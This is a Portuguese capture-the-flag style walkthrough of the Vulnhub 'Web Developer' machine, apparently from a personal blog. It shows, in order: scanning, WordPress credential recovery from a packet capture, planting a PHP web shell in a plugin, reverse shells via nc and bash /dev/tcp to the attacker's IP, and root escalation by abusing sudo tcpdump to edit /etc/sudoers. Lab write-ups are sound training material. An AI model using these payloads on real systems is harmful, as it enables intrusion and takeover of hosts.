---
title: Vulnhub - WebDeveloper 
categories: [Vulnhub]
#tags: []
---


![](/assets/img/Vulnhub/WebDeveloper/capa.png)

## Link da Maquina: <https://www.vulnhub.com/entry/web-developer-1,288/>




# Scan/Enumeracao


## Host Discovery


Com o comando **arp-scan** varremos a rede para descobrir os hosts ativos e consequentemente o IP do nosso alvo: **192.168.110.12**

```bash
sudo arp-scan -I eth1 192.168.110.0/24
```

![](/assets/img/Vulnhub/WebDeveloper/host-discovery.png)


## Port Discovery


Com o parametro "-p-" do nmap varremos todas as portas possiveis do nosso alvo e encontramos 02 delas abertas. **22** e **80**

```bash
sudo nmap -n -T5 -p- 192.168.110.12
```

![](/assets/img/Vulnhub/WebDeveloper/port-discovery.png)



## Port Scan


Agora com o parametro "-A" do nmap vamos descobrir mais informacoes sobre essas portas abertas do nosso alvo

```bash
sudo nmap -n -T5 -A -p 22,80 192.168.110.12
```

![](/assets/img/Vulnhub/WebDeveloper/port-scan.png)

> - Porta 22:       ssh     OpenSSH 7.6p1 Ubuntu 4
> - Porta 80:       http    Apache httpd 2.4.29



# Enumeracao/Exploracao Web - Porta 80

## Inspecao Visual

O primeiro passo e verificar o que temos na pagina web pelo browser. Temos um WordPress

![](/assets/img/Vulnhub/WebDeveloper/web-inspecaoVisual.png)


Nao encotramos nada de util no codigo fonte da pagina


## Enumeracao WEB - Nikto 

Rodamos o Nikto, encontramos alguns diretorios, mas nada de interessante ate agora

```bash
nikto -h http://192.168.110.12/ 
```

![](/assets/img/Vulnhub/WebDeveloper/web-nikto.png)


## Enumeracao WEB - WPSCAN

Rodamos o wpscan para procurar vulnerabilidades na aplicacao

```bash
wpscan --url http://192.168.110.12 -e ap,at,u
```

![](/assets/img/Vulnhub/WebDeveloper/web-nikto.png)


Encontramos um usuario: **webdeveloper**

![](/assets/img/Vulnhub/WebDeveloper/web-wpscan-user.png)


## Enumeracao de diretorios WEB - GOBUSTER

Realizamos o fuzzy de diretorios com o Gobuster. Obtivemos alguns resultados interessantes, dentre eles temos o diretorios **/ipdata** e o arquivo **/xmlrpc.php**

![](/assets/img/Vulnhub/WebDeveloper/web-gobuster.png)


### /ipdata

Acessando a pagina temos um arquivo ".cap"

![](/assets/img/Vulnhub/WebDeveloper/web-ipdata.png)


Baixamos ele para a nossa maquina


### /xmlrpc.php

Nessa outra pagina encontramos **XML-RPC server**

![](/assets/img/Vulnhub/WebDeveloper/web-xmlrpc.png)


Procuramos por exploits publicos para ele mas nao conseguimos nenhum resultado positivo


## Wireshark

Analizando o arquivo **analyze.cap** com o wireshark, clicando com o **Botao direito do mouse** -> **Follow** -> **TCP Stream**, conseguimos achar no **Stream 8** o envio por "POST" de um formulario onde contem as informacoes de login e senha do usuario "webdeveloper", queencontramos com o wpscan.

![](/assets/img/Vulnhub/WebDeveloper/pcap-1.png)

> - log=webdeveloper&pwd=Te5eQg%264sBS%21Yr%24%29wf%25%28DcAd&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.176%2Fwordpress%2Fwp-admin%2F&testcookie=1


Encontramos a seguinte credencial, de acordo com o formulario, **webdeveloper:Te5eQg%264sBS%21Yr%24%29wf%25%28DcAd**


A senha esta com alguns caracteres codificados para URL. O proximo passo consiste em decodifica-los para tentarmos acessar o painel de administracao do WordPress

![](/assets/img/Vulnhub/WebDeveloper/burp-decoderURL.png)

> - **webdeveloper:Te5eQg&4sBS!Yr$)wf%(DcAd**


## WordPress

Conseguimos acessar o painel de administracao do WP com a credencial **webdeveloper:Te5eQg&4sBS!Yr$)wf%(DcAd**.

![](/assets/img/Vulnhub/WebDeveloper/wp-login.png)


Navegando pelo painel nao encontramos nenhum tema que conseguimos editar. Depois de procurar mais fundo encontramos alguns plugins que temos permissao para edicao.


Editamos a pagina **akismet/index.php** com o "php do mal", para ver se conseguimos RCE.

```bash
<?php system($_GET['cmd']); ?>
```

![](/assets/img/Vulnhub/WebDeveloper/wp-phpDoMal.png)



Agora acessamos a pagina do plugin e constatamos que temos RCE!

```
http://192.168.110.12/wp-content/plugins/akismet/index.php?cmd=id
```

![](/assets/img/Vulnhub/WebDeveloper/wp-rce.png)



## Shell Reverso

Bom... ja que temos RCE na pagina do wordpress, agora so precisamos mosntar o nosso payload, encodar e passar via URL para ganhar o shell...


Primeiro passo e procurar por um comando que nos retorne o shell. Como temos um RCE podemor procurar se tem o programa antes de tentar usa-lo. Agora sabemos que o alvo tem o nc instalado

```
192.168.110.12/wp-content/plugins/akismet/index.php?cmd=whereis%20nc
```

![](/assets/img/Vulnhub/WebDeveloper/shellReverso-whereisPython.png)


* **RBSCheat**

O rbscheat e um programa criado para deixar mais performatica a busca por um comando para nos retornar o shell. Basta utilizar o comando com o parametro do IP e a porta que ira receber o shell e o nome com qual programa ele executara para nos retornar o shell. Ele pode ser encontrado e instalado de acordo com as instrucoes que estao no seu repositorio na pagina do seu autor <https://github.com/marciosouza20/rbscheat>.

```bash
rbscheat -i 192.168.110.3:443 -l nc 
```

![](/assets/img/Vulnhub/WebDeveloper/rbscheat.png)



* **BurpSuite - Decoder**

Vamos utilizar o burp para codificar o nosso payload

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.3 443 >/tmp/f
```

```
%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%39%32%2e%31%36%38%2e%31%31%30%2e%33%20%34%34%33%20%3e%2f%74%6d%70%2f%66
```

![](/assets/img/Vulnhub/WebDeveloper/shellReverso-payload.png)


Agora passamos o nosso payload via URL

```
192.168.110.12/wp-content/plugins/akismet/index.php?cmd=%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%31%30%2e%33%2f%34%34%33%20%30%3c%26%31
```

Para conseguir o shell reverso, primeiramente invocamos o bash para conseguir melhorar o shell posteriormente, depois deixamos a porta aberta. Depois de passar o payload via URL recebemos o shell do alvo!

![](/assets/img/Vulnhub/WebDeveloper/shell-Reverso.png)


### Shell Interativo

Importamos o tty, no shell do alvo, com o seguinte comando:

```bash
python3 -c "__import__('pty').spawn('/bin/bash')"
```

Depois **CTRL+Z**

No shell da kali digitar o seguinte comando:

```bash
stty raw -echo
```

Depois digitar **fg** e apertar **Enter** duas vezes

Pronto, agora temos um shell mais performatico!


# Usuario www-data

Conseguimos achar a credencial para acessar o banco de dados no arquivo **/var/www/html/wp-config.php**

![](/assets/img/Vulnhub/WebDeveloper/wwwData-wpConfig.png)

> - **webdeveloper:MasterOfTheUniverse**


# Usuario webdeveloper

Conseguimos logar com o usuario webdeveloper, aproveitando a reutilizacao da senha do banco de dados, **webdeveloper:MasterOfTheUniverse**

![](/assets/img/Vulnhub/WebDeveloper/webdeveloper.png)


## Escalando Privilegio

Seguindo a metodologia a primeira coisa que verificamos foi se o usuario tem permissao para usar algum comando com o **sudo**. Agora sabemos que o usuario pode executar o **tcpdump** como root, usando o sudo.

```bash
sudo -l
```

![](/assets/img/Vulnhub/WebDeveloper/sudo-l.png)


### TCPDUMP

Depois de tentar diversas formas, sem sucesso, para conseguir escalar privilegio com o tcpdump a unica que conseguimos foi adicionando o usuario ao /etc/sudoers. O passo a passo e o seguinte:

```bash
echo 'echo "webdeveloper ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /tmp/charlie && chmod +x /tmp/charlie

cat /tmp/charlie

sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/charlie -Z root

sudo -l
```

![](/assets/img/Vulnhub/WebDeveloper/tcpdump-root.png)


Agora com conseguimos executar qualquer comando com o sudo. Portanto conseguimos escalar privilegio para o root facilmente

![](/assets/img/Vulnhub/WebDeveloper/root.png)

**I am gROOT!**


# Flag

Conseguimos pegar a flag de root

![](/assets/img/Vulnhub/WebDeveloper/flag-root.png)


# Bonus

## Recuperacao de Imagem do arquivo ".cap"

Abrimos a captura no wireshark e vimos que contem uma imagem

![](/assets/img/Vulnhub/WebDeveloper/wireshark-1.png)


Para verificar com mais precisao vamos dar uma olhada na requisicao. **"Botao direito do mouse" -> "Follow" -> "TCP Stream"**

![](/assets/img/Vulnhub/WebDeveloper/wireshark-2.png)


Para baixar a imagem voltamos para o painel da captura e clicamos duas vezes no pacote que a imagem foi enviada

![](/assets/img/Vulnhub/WebDeveloper/wireshark-3.png)


Para copiar o conteudo hexadecimal da imagem: **"Botao direito do mouse" -> "Copy" -> "... as a Hex Stream"**

![](/assets/img/Vulnhub/WebDeveloper/wireshark-4.png)


Para ter certeza que foi copiado corretamente e recomendado colar o conteudo em um editor de texte e comparar os primeiros e os ultimos numeros da copia e do original


Depois da conferencia criamos um arquivo para mudarmos o hexadecimal dele

![](/assets/img/Vulnhub/WebDeveloper/bonus-1.png)


Agora vamos editar o hexadecimal do arquivo criado com o **hexedit**

```bash
hexedit imagem_captura.png
```

![](/assets/img/Vulnhub/WebDeveloper/bonus-2.png)


Colamos o conteudo que copiamos da captura ".cap" com o **CTRL+Shift+V**

![](/assets/img/Vulnhub/WebDeveloper/bonus-3.png)


Salvamos o conteudo usando as teclas **CTRL+X**

![](/assets/img/Vulnhub/WebDeveloper/bonus-4.png)


Pronto, agora conseguimos copiar a imagem da captura para a nossa maquina

![](/assets/img/Vulnhub/WebDeveloper/bonus-5.png)